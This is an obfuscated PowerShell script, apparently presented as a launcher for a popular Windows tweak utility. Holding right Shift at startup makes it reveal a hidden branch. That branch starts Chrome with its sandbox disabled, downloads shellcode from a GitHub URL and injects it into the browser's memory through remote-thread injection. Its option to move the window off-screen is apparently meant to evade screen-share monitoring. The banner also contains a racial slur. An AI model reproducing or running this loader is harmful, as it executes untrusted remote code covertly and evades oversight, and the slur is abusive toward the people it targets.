. ( $VeRbosEPrEfEReNcE.TOStrInG()[1,3]+'x'-joIn'')(('Clear-Host'+'

# Ke'+'y detection voorbereiden
A'+'dd-Type -Member'+'Definition @Yad
    [DllI'+'mport(Yaduser32.dllYa'+'d)]
    public static ext'+'er'+'n short GetAsyncKeyState(int vKey);
Yad@ -Name Keyboar'+'d -Names'+'pace Win32

NH3VK_RSHIFT = 0xA1

NH3timeout = [DateTime]::Now.AddSeconds(3)
NH3shiftPressed ='+' NH3false

do {
    Start-'+'Sleep -Millisecon'+'ds 30

    if ([Win32.Keyboard]::GetAsyncKeyState(NH'+'3VK_RSHIFT) -lt 0) {
   '+'     NH3shiftPressed = NH3true
        break
    }

} while ([DateTime]::Now -lt NH3timeout)

if (NH3shiftPr'+'essed) {
    Write-Host YadYad
    Write-Host Yad  ----------------'+'------------------------Yad'+' -ForegroundColor '+'Cyan
  '+'  Write-Host Yad  I             '+'                 '+'        IYad -ForegroundColor Cyan
    Write-Host Yad  I       NIGG'+'ER BYPASS  v6.7            IYad -ForegroundColor Cyan
    Write-Host Yad  I       Gemaakt door: MJBP <3          IYad -ForegroundColor Cyan
    Writ'+'e-Hos'+'t Yad  I  '+'                  '+'                  IYa'+'d -ForegroundColor Cyan
    Write-Host Yad  ---------------------------'+'------'+'-------Yad -ForegroundColor Cyan
   '+' Write-Host YadYad
    Write-Host YadYad
    Start-Sleep -Milli'+'seconds 500

    # ==================== VOLLEDIG BYPASS SCRIPT ====================

    Write-Host YadYad
    Write'+'-Host Yad[1] Streamproof versie.Yad -ForegroundColor Yellow
    Write-Host Yad[2] Zonder Streamproof versie.Yad -Fore'+'groundColor Yellow
    NH3cho'+'ice1 = Read-Host YadMaak je keuze (1 of '+'2).Yad

    i'+'f (NH'+'3choice1 -e'+'q Yad'+'1'+'Yad'+') {
    '+'   '+' NH3url = Yadhttps://raw.githubusercontent.com/MJ06-BP/bp/main/browser.binYad
        NH'+'3useNvidi'+'aByp'+'ass = NH3false
        Write-Host Yad'+'[+'+'] Streamproof versie gekozen'+'.Yad -ForegroundColor Gre'+'en
    }
    '+'elseif (NH3choice1 -eq Yad2Yad) {
        NH3url = Yadh'+'ttps:'+'//raw.githubusercontent.com/MJ06'+'-BP/bp/main/shellcode.binYa'+'d
        Write-Host Yad[1] Ja, Nvidia clip gebruiken.Yad -ForegroundColor Yellow
        Write-Host Yad[2] Ne'+'e,'+' geen Nvidia clip.Yad -ForegroundColor Yellow
'+'        NH3'+'nvidiaCh'+'oic'+'e = Read-Host YadWil je Nvidia Bypass? (1 of 2)'+'Yad
   '+'     NH3useNvidiaBypass = (NH3nvidiaChoice '+'-eq Yad1Yad)
        if (NH3useNvidia'+'Bypass) {
            Write-Host Yad[+] Nvidia Bypa'+'ss ingeschakeld.Yad -ForegroundColor Green
        } else {
            Write-Host Yad[+] Nvidia Bypass uitgeschakeld.Yad -ForegroundColor Yellow
        }
    }
    else {
        Write-Host Yad[-] Ongeldige keuze!Yad -ForegroundColor Red
        pause; exit
    }

    NH3MonitorX = 0
    NH3Width = 1920
    NH3H'+'eight = 1080

    if (NH3useNvidiaBypass) {
        Write-Host YadYad
    '+'    Write-Host Yad[1] Tweede monito'+'r staat LINKS.'+'Yad -ForegroundColor Yellow
        Write-Host Yad[2] Tweede monitor staat RECHTS.Yad -ForegroundColor Ye'+'l'+'low
        NH3'+'monChoice = Read-'+'Host YadMaak je ke'+'uze (1 of 2).Y'+'ad
   '+'     if (NH3monChoice'+' -eq Yad1Yad) { NH3MonitorX = -192'+'0 }
        el'+'seif (NH3mo'+'nChoice -eq Y'+'ad2Yad) { NH3Mo'+'nitorX ='+' 1920 }
        else { Write-Hos'+'t Y'+'ad[-] Ongeldige keuze!Yad -ForegroundColor Red; pause; exit }
    }

  '+'  if '+'(-not [Environment]::Is64BitProcess) {
        Write-Host Yad[-] Gebruik 64-bit PowerShell als Administrator!Yad -ForegroundColor Red
        pause; ex'+'it
    }

    f'+'unction Inv'+'oke-NvidiaB'+'ypass {
        param([int]NH3Tar'+'getPID, [int]NH3M'+'onitorX = -1920, [int]NH3Width = 1920, ['+'int]NH3Height = 1080)
        '+'Add-'+'Type @Yad
using System;
using S'+'ystem.Runtime.InteropServices;
public class Win32 {
    [DllImport(Yaduser32.dllYad)] public static exter'+'n boo'+'l MoveWindow(IntPtr hWnd, int X'+', int Y, int nWidth, int nHeight, bool bRepaint);
    [DllImport(Yaduser32.dllYad)]'+' public stati'+'c extern bool SetForegroundW'+'indow(IntPtr hWnd);
    [DllImport(Yaduser32.dllYad)] public static extern uin'+'t'+' GetWindowThreadProcessI'+'d(IntPtr hWnd, out uint lpdwProcessId);
}
Yad@ -ErrorAction'+' Silently'+'Continue

        NH3process = Get-Process -Id NH3TargetPID '+'-ErrorAction SilentlyContinue
        if (-not NH3process) { Wri'+'te-Host Yad[-]'+' Proces niet gevondenYad -ForegroundColor Red;'+' ret'+'urn }

        NH3hwnd'+' = NH3process.MainW'+'indowHandle

        if (NH3hwnd '+'-eq'+' [IntPtr]::Zero) {
 '+'           NH3h'+'wnd = [I'+'ntPtr]::Zero
      '+'      NH'+'3callb'+'ack = {
                param(NH3hWnd, NH3lParam)
                NH3procId = 0
     '+'           [Win32]::GetWi'+'ndowThreadProcessId(NH3'+'hWnd, [ref]NH3procId) DTa Out-Null
                if (NH3procId -eq NH3Ta'+'rgetPID) { NH3script:hwnd = NH3hWnd; return NH3false }
                return NH3true
            }
   '+'         NH3delegate = New-Object '+'System'+'.Func'+'[In'+'tPtr, IntPtr, bool] NH3callback
            [Win32]'+'::EnumWindows'+'(NH3delegate, [IntPtr]::Zero) DTa Out-Null
        }

        if (NH3hwnd -eq ['+'IntPtr]::Zero) {
            Write-Host Yad[-]'+' Geen '+'venster gevondenYad -For'+'egroundColor Red
            r'+'eturn
        }

       '+' [Win32]::SetForegroundWindow(NH3hw'+'nd) DTa Out-'+'Nul'+'l
        f'+'or (NH3i = 1; NH3i -le 6; NH3i+'+'+) {
       '+'     '+'[Win32]::MoveWindow(NH3hwnd, NH3MonitorX, 0, NH3Width, NH3Height, NH3true) DTa Out-Null
            Start-Sleep -Milliseconds 15'+'0
        }
    }

    try {
        Start-Process Yadchr'+'ome.exeYad -ArgumentList Yad--no-s'+'a'+'ndbox --start-maxim'+'izedYad'+'
      '+'  Start-Sleep '+'2'+'
    } catch'+' {'+'
        Write-Host Yad[-] Kon Chrome niet starten.Yad -ForegroundColor Red
        pause; exit
    }

    NH3targetProcess = Get-Process -Name Yadc'+'hromeYad DTa Where-Object { NH3_.MainWindowTitle -ne YadYad } DTa Selec'+'t-Object -First 1
   '+' if (-not NH3targetProcess'+') '+'{
        NH3targetProc'+'ess = Get-Process -Name YadchromeYad DTa Sort-O'+'bje'+'ct WorkingSet64 DTa '+'Select-Object -First'+' 1
    }

    NH3targetPID = NH3targetProcess.Id
    Writ'+'e-Host Y'+'ad[+] Chrome PID: NH3targetP'+'IDYad -ForegroundCol'+'or Green

    if (NH3useNvidiaBypass) {
        Start-Sleep -Milliseconds 2000
        Invo'+'ke-NvidiaBypass -TargetPID NH3targetPID -MonitorX NH3Mon'+'ito'+'rX
    }

    try {
        NH3shellcode = (New-Object Net.WebClient).DownloadData(NH'+'3url)
    } '+'catch {
        Write-Host Yad[-] Download mislukt: NH3(NH3_'+'.Exception.Message)Yad -For'+'egroundColor Red
        pause; exit
    }

    NH3size = NH3shellcode.Length

'+'    Add-Type -MemberDefinition @Yad
        [DllImport(Yadkernel32.dllYad)] publi'+'c static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHan'+'dle, uint dwProcessId);
  '+'    '+'  ['+'DllImport(Yadkernel3'+'2.dllYad)] publ'+'ic sta'+'tic extern '+'IntPtr VirtualAllocEx(IntPtr hProces'+'s, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport(Yadkernel32.dllYad)] public static ex'+'tern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nS'+'ize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport(Yadkernel32.dllYad)] public static '+'extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProte'+'ct, out '+'uint lpflOldProtect);
       '+' [DllImport(Yadkernel32.dllYad)] public static extern IntPtr Create'+'RemoteThread(IntPtr hProcess, IntPtr l'+'pThreadAt'+'tributes,'+' uint '+'dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out ui'+'nt lpThreadId);
      '+'  [DllImport(Yad'+'kernel32.dllYad)] public static extern bool CloseHa'+'ndle(IntPtr hObject);
Yad@ -Name Win32'+' -Namespace Native -PassThru

    try {
        NH3'+'hProcess = [Native.Wi'+'n32]::OpenPr'+'oc'+'ess(0x001'+'F0FFF, NH3false, NH3t'+'ar'+'getPI'+'D)
        if (NH3hProcess -eq [IntPtr]::Zero) { 
            throw YadOpenProcess mislukt. Script moet als Admi'+'nistrator draaien'+'!Yad '+'
        }

        '+'NH3a'+'ddr = [Native.Win32]::V'+'irtualAllocEx(NH3hProcess,'+' [IntPtr]::Zero, [uint32]NH3size, 0x3000, 0x40)
        N'+'H3bytesWri'+'tten = '+'[UIntPtr]::Zero
    '+'    [Native.Win32]::WriteProcessMemory(NH3hProcess, NH3ad'+'dr, NH3shellcode, [uint32]NH3size, [ref]NH3bytesWritten) DTa Out-Null
        [Native.Win32]::VirtualProtectEx(N'+'H3hProcess, NH3ad'+'dr, [uint32]NH3size, 0x20, [ref]NH3n'+'ull) DTa'+' Out-Null
        [Native.'+'Win32]::CreateRemoteThread(NH3hP'+'rocess, [IntP'+'tr]::Zero, 0, NH3a'+'ddr, [IntPtr]::Zero, 0, [ref]NH3null) DTa O'+'ut-Null

        Write-Ho'+'st Yad[+] Injectie succesvol!Ya'+'d -Fore'+'groundColor Green
    }
    catch {
        Write-Host Y'+'ad[-] Injectie mislukt: NH3(NH3_.Exc'+'eption.Message)Yad -ForegroundColor Red
        pause; exit
    }
    finally {
        if (NH3hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle(NH3'+'hProcess) DTa Out-Null }
    }

    if (NH3u'+'seNvidiaBypass) {
        Sta'+'rt-Sleep -Mi'+'lliseconds 2500'+'
        Invoke-NvidiaBypass -TargetPID NH'+'3targetPID -Moni'+'torX NH3MonitorX
    }

    Clear-Host
    Write-Host YadYad
    Write-H'+'ost Yad  ----------------------------------------'+'Yad -ForegroundColor '+'Cyan
    Write-Hos'+'t Yad  I                                      IYad '+'-ForegroundColor Cyan
    Write-Host Yad  I       NIGGER BYPASS  '+'v6.7            I'+'Yad -ForegroundColor Cyan
    Write-Host Yad  I       '+'Gemaakt door: MJBP <3          IYad -For'+'egroundColor Cyan
    Write-Host Yad  I     '+'                                '+' IYad -Foregro'+'undColor Cyan
    Write-Host Ya'+'d  -----------'+'---------------'+'--------------Yad -ForegroundColor Cyan
    Write-Host YadYad
    Write-Host Yad[!] Laat'+' Chrome '+'open staan!Yad -ForegroundColor Red
'+'    Write-Host Yad[-] Om'+' te cleanen: druk op END of sluit C'+'hrome helemaal'+' af.Ya'+'d -ForegroundCo'+'lor Yellow
    Write-H'+'ost Yad[<3]'+' '+'#CLEANYad -Foregr'+'oundColor Cyan

} 
else {
    try {
        irm Yadht'+'tps://christitus.com/winYad DTa iex
    }
    catch {
 '+'   }
  '+'  NH3null '+'= NH3Host.UI.RawUI.ReadKey(Y'+'adNoEcho,IncludeKeyDownYad)
}
').RePLace('DTa',[StRinG][CHAr]124).RePLace(([CHAr]78+[CHAr]72+[CHAr]51),[StRinG][CHAr]36).RePLace('Yad',[StRinG][CHAr]34) )
